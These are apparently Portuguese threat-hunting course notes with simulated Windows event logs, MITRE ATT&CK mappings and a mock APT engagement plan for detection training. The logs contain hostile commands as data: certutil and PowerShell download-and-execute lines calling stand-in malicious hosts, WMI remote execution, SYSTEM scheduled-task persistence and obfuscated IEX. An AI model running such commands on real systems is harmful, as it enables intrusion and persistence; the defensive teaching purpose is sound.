# Caça a Ameaças Persistentes (APTs)
01. Padrões de Ataque de APTs Living-off-the-Land (LotL)
02. Táticas de Evasão em EDRs
03. Uso do MITRE ATT&CK para Construção de Hipóteses
04. Identificação de artefatos maliciosos
05. Simulação de Ataque APT

## 01.5. Atividade Prática
Desafio: Analisar um conjunto de logs simulados (Sysmon, Security, PowerShell) e identificar:
- Uso de ferramentas LotL para execução de payloads.
- Tentativas de movimentação lateral via WMI e SMB.
- Artefatos que indicam persistência ou evasão.

Entrega esperada:
- Mapeamento das técnicas utilizadas com base no MITRE ATT&CK.
- Extração de IOCs e artefatos relevantes.
- Criação de hipóteses investigativas.
- Proposta de regras Sigma para detecção.

### Sysmon Logs (Event ID 1 – Process Creation)
Execução de PowerShell com comando obfuscado
```
<EventID>1</EventID>
<Image>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Image>
<CommandLine>powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBtAG...==</CommandLine>
<ParentImage>C:\Windows\explorer.exe</ParentImage>
<User>ADINT\Smith</User>
```
### Sysmon Logs (Event ID 1 – Process Creation)
Uso de CertUtil para download de payload
```
<EventID>1</EventID>
<Image>C:\Windows\System32\certutil.exe</Image> 
<CommandLine>certutil.exe -urlcache -split -f http://malicious[.]site/payload.bin C:\Users\Public\payload.bin</CommandLine>
<ParentImage>C:\Windows\System32\cmd.exe</ParentImage> 
<User>ADINT\Smith</User>
```
### Sysmon Logs (Event ID 1 – Process Creation)
Execução remota via WMI
```
<EventID>1</EventID>
<Image>C:\Windows\System32\wmic.exe</Image>
<CommandLine>wmic /node:"192.168.1.22" process call create "powershell -EncodedCommand SQBtAG..."</CommandLine>
<ParentImage>C:\Windows\System32\cmd.exe</ParentImage> 
<User>ADINT\Smith</User>
``` 
### Security Logs (Event ID 4624 – Logon Success)
Autenticação remota com conta privilegiada
```
<EventID>4624</EventID>
<SubjectUserName>admin</SubjectUserName> 
<LogonType>3</LogonType>
<WorkstationName>FINANCEIRO-PC</WorkstationName> 
<SourceNetworkAddress>192.168.1.10</SourceNetworkAddress>
<AuthenticationPackage>NTLM</AuthenticationPackage>
``` 
### Security Logs (Event ID 4624 – Logon Success)
Autenticação remota com conta privilegiada
```
<EventID>4624</EventID>
<SubjectUserName>admin</SubjectUserName> 
<LogonType>3</LogonType>
<WorkstationName>FINANCEIRO-PC</WorkstationName> 
<SourceNetworkAddress>192.168.1.10</SourceNetworkAddress>
<AuthenticationPackage>NTLM</AuthenticationPackage>
```
### Security Logs (Event ID 4624 – Logon Success)
Logon interativo suspeito em máquina lateral
```
<EventID>4624</EventID>
<SubjectUserName>admin</SubjectUserName>
<LogonType>10</LogonType>
<WorkstationName>RH-PC</WorkstationName>
<SourceNetworkAddress>192.168.1.10</SourceNetworkAddress>
<AuthenticationPackage>Kerberos</AuthenticationPackage>
```
### PowerShell Logs (Event ID 4104 – Script Block Logging)
Script obfuscado com função de download
```
EventID: 4104 
ScriptBlockText: 
$wc = New-Object System.Net.WebClient 
$payload =  $wc.DownloadString("http://malicious[.]site/payload.ps1") 
Invoke-Expression $payload
```
### PowerShell Logs (Event ID 4104 – Script Block Logging)
Criação de tarefa agendada para persistência
```
EventID: 4104 
ScriptBlockText: 
schtasks /create /tn "Updater" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\payload.ps1" /sc minute /mo 30 /ru SYSTEM
```

## 02. Táticas de evasão em EDRs
### 02.4. Exemplos de Logs
### 1. Sysmon Logs (Event ID 1 – Process Creation)
Execução de PowerShell com comando obfuscado
```
<EventID>1</EventID>
<Image>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Image>
<CommandLine>powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBtAG...==</CommandLine>
<ParentImage>C:\Windows\explorer.exe</ParentImage>
<User>ADINT\Smith</User>
```
### 1. Sysmon Logs (Event ID 1 – Process Creation)
Criação de processo legítimo para hollowing
```
<EventID>1</EventID>
<Image>C:\Windows\System32\notepad.exe</Image>
<CommandLine>notepad.exe</CommandLine>
<ParentImage>C:\Windows\System32\cmd.exe</ParentImage>
<User>ITAGUAI\thiago</User>
```
### 1. Sysmon Logs (Event ID 1 – Process Creation)
Execução de DLL maliciosa dentro do processo hollowed
```
<EventID>1</EventID>
<Image>C:\Windows\System32\notepad.exe</Image>
<CommandLine>notepad.exe (injected)</CommandLine>
<ParentImage>C:\Windows\System32\notepad.exe</ParentImage>
<User>ADINT\Smith</User>
```
### 2. Security Logs (Event ID 4688 – Process Creation Audit)
Execução de código via processo legítimo (indicando hollowing)
```
<EventID>4688</EventID>
<NewProcessName>C:\Windows\System32\notepad.exe</NewProcessName>
<ParentProcessName>C:\Windows\System32\cmd.exe</ParentProcessName>
<SubjectUserName>admin</SubjectUserName>
<CommandLine>notepad.exe</CommandLine>
```
### 3. PowerShell Logs (Event ID 4104 – Script Block Logging)
Comando obfuscado com base64 e função de execução
```
EventID: 4104
ScriptBlockText:
$cmd = 'SQBtAG...=='
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cmd)) 
Invoke-Expression $decoded
```
### 3. PowerShell Logs (Event ID 4104 – Script Block Logging)
Fragmentação de comando malicioso
```
EventID: 4104 
ScriptBlockText: 
$a = 'Invoke-';
$b = 'WebRequest';
$c = '("http://malicious[.]site/payload.ps1")'; 
Invoke-Expression ($a + $b + $c)
```

## 03.4. Atividade Prática
Cenário Simulado: Logs de um endpoint mostram execução de PowerShell e criação de tarefas agendadas.
```
[2026-04-08 08:14:22] EventID: 4698 
SubjectUserName: SYSTEM 
TaskName: \Microsoft\Windows\Update\ScheduledUpdate 
ActionType: Execute 
Command: powershell.exe -ExecutionPolicy Bypass -File "C:\Users\Public\update.ps1" 
```
```
[2026-04-08 08:14:23] EventID: 4104 
ScriptBlockText:
$client = New-Object System.Net.WebClient;
$client.DownloadString("http://malicious-domain.com/payload.ps1") | IEX
```
```
[2026-04-08 08:14:24] EventID: 4688 
NewProcessName: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentProcessName: svchost.exe 
CommandLine: powershell.exe -ExecutionPolicy Bypass -File "C:\Users\Public\update.ps1"
```
```
[2026-04-08 08:14:25] EventID: 5156 
Application: powershell.exe 
DestinationIP: 185.203.119.45 
DestinationPort: 443 
Protocol: TCP 
```
```
[2026-04-08 08:14:26] EventID: 4663 
ObjectName: C:\Users\Public\update.ps1 
AccessMask: 0x2 (WriteData) 
AccessType: Write 
SubjectUserName: SYSTEM
```
### Resultado
- Persistência:

Criação de tarefa agendada (EventID: 4698) com execução de script PowerShell → Técnica T1053.005 

- Execução: 

Uso de PowerShell com ExecutionPolicy e Invoke-Expression(IEX) → Técnica 1059.001 

- C2: 

Comunicação com IP externo via PowerShell → Técnica T1071.001 

- Artefato: 

Script update.ps1 modificado e executado

## 05. Simulação de Ataque APT

### 05.4. Demonstração da simulação de Ataque APT
Escopo: www.fail.corp

Fora do escopo: Engenharia Social, Phishing, DoS e DDoS

Hosts: 
- WebServer
- Workstation
- SQL Server
- Domain Controller

Objetivos:
- Acesso inicial via aplicação web
- Pivoteamento para rede interna
- Movimentação Lateral
- Dump de hashes
- Keberoasting
- Obter acesso completo ao DC

### 05.5. Mapeamento de TTPs com MITRE - WebServer
Acesso inicial: 
- T1190 - Exploit Public-Facing Application

Pós Exploração: 
- T1552.001 - Unsecured Credentials: Configuration Files
- T1005 – Data from Local System
- T1110.002 – Password Cracking
- T1078 – Valid Accounts
- T1087.001 – Account Discovery: Local Account
- T1110.003 – Brute Force: Password Spraying
- T1016 – System Network Configuration Discovery

Pivot: T1090 – Proxy (Pivoting) & T1046 – Network Service Discovery

### 05.5. Mapeamento de TTPs com MITRE - Workstation
Movimentação lateral: 
- T1078 – Valid Accounts & T1021 – Remote Services

Escalação de Privilégios:
- T1134.003 – Access Token Manipulation: Token Impersonation/Theft

Pós Exploração:
- T1003 – OS Credential Dumping
- T1003.002 - Security Account Manager (SAM)
- T1558.003 – Steal or Forge Kerberos Tickets: Kerberoasting
- T1110.002 – Password Cracking

### 05.5. Mapeamento de TTPs com MITRE - SQL Server
Pass The Hash: 
- T1550.002 – Use Alternate Authentication Material: Pass the Hash

Pós Exploração:
- T1003 – OS Credential Dumping
- T1003.002 - Security Account Manager (SAM)
- T1003.004 - LSA Secrets

Movimentação lateral:
- T1078 – Valid Accounts
- T1021 – Remote Services
- T1005 – Data from Local System
- T1505.001 – Server Software Component: SQL Stored Procedures

### 05.5. Mapeamento de TTPs com MITRE - Domain Controller
Movimentação lateral: 
- T1078 – Valid Accounts & T1021 – Remote Services

Escalação de Privilégios:
- T1134.003 – Access Token Manipulation: Token Impersonation/Theft

Pós Exploração:
- T1003 – OS Credential Dumping
- T1003.003 – Dump de credenciais do Active Directory (NTDS.dit)

Pass The Hash:
- T1550.002 – Use Alternate Authentication Material: Pass the Hash

05.5. Mapeamento de TTPs com MITRE
```
{
  "version": "4.5",
  "name": "Mapeamento TTPs - WebServer, Workstation, SQL Server, Domain Controller",
  "description": "Camada de técnicas mapeadas para diferentes alvos (WebServer, Workstation, SQL Server, Domain Controller)",
  "domain": "enterprise-attack",
  "techniques": [
    { "techniqueID": "T1190", "comment": "WebServer - Acesso inicial" },
    { "techniqueID": "T1552.001", "comment": "WebServer - Pós Exploração" },
    { "techniqueID": "T1005", "comment": "WebServer - Pós Exploração" },
    { "techniqueID": "T1110.002", "comment": "WebServer - Pós Exploração" },
    { "techniqueID": "T1078", "comment": "WebServer - Pós Exploração" },
    { "techniqueID": "T1087.001", "comment": "WebServer - Pós Exploração" },
    { "techniqueID": "T1110.003", "comment": "WebServer - Pós Exploração" },
    { "techniqueID": "T1016", "comment": "WebServer - Pós Exploração" },
    { "techniqueID": "T1090", "comment": "WebServer - Pivoting" },
    { "techniqueID": "T1046", "comment": "WebServer - Pivoting" },

    { "techniqueID": "T1078", "comment": "Workstation - Movimentação lateral" },
    { "techniqueID": "T1021", "comment": "Workstation - Movimentação lateral" },
    { "techniqueID": "T1134.003", "comment": "Workstation - Escalação de Privilégios" },
    { "techniqueID": "T1003", "comment": "Workstation - Pós Exploração" },
    { "techniqueID": "T1003.002", "comment": "Workstation - Pós Exploração" },
    { "techniqueID": "T1558.003", "comment": "Workstation - Pós Exploração" },
    { "techniqueID": "T1110.002", "comment": "Workstation - Pós Exploração" },

    { "techniqueID": "T1550.002", "comment": "SQL Server - Pass The Hash" },
    { "techniqueID": "T1003", "comment": "SQL Server - Pós Exploração" },
    { "techniqueID": "T1003.002", "comment": "SQL Server - Pós Exploração" },
    { "techniqueID": "T1003.004", "comment": "SQL Server - Pós Exploração" },
    { "techniqueID": "T1078", "comment": "SQL Server - Movimentação lateral" },
    { "techniqueID": "T1021", "comment": "SQL Server - Movimentação lateral" },
    { "techniqueID": "T1005", "comment": "SQL Server - Movimentação lateral" },
    { "techniqueID": "T1505.001", "comment": "SQL Server - Movimentação lateral" },

    { "techniqueID": "T1078", "comment": "Domain Controller - Movimentação lateral" },
    { "techniqueID": "T1021", "comment": "Domain Controller - Movimentação lateral" },
    { "techniqueID": "T1134.003", "comment": "Domain Controller - Escalação de Privilégios" },
    { "techniqueID": "T1003", "comment": "Domain Controller - Pós Exploração" },
    { "techniqueID": "T1003.003", "comment": "Domain Controller - Pós Exploração" },
    { "techniqueID": "T1550.002", "comment": "Domain Controller - Pass The Hash" }
  ],
  "gradient": {
    "colors": ["#ffffff", "#ff6666"],
    "minValue": 0,
    "maxValue": 1
  },
  "legendItems": [
    { "label": "Técnicas mapeadas", "color": "#ff6666" }
  ],
  "showTacticRowBackground": true,
  "selectTechniquesAcrossTactics": true
}
```








- 

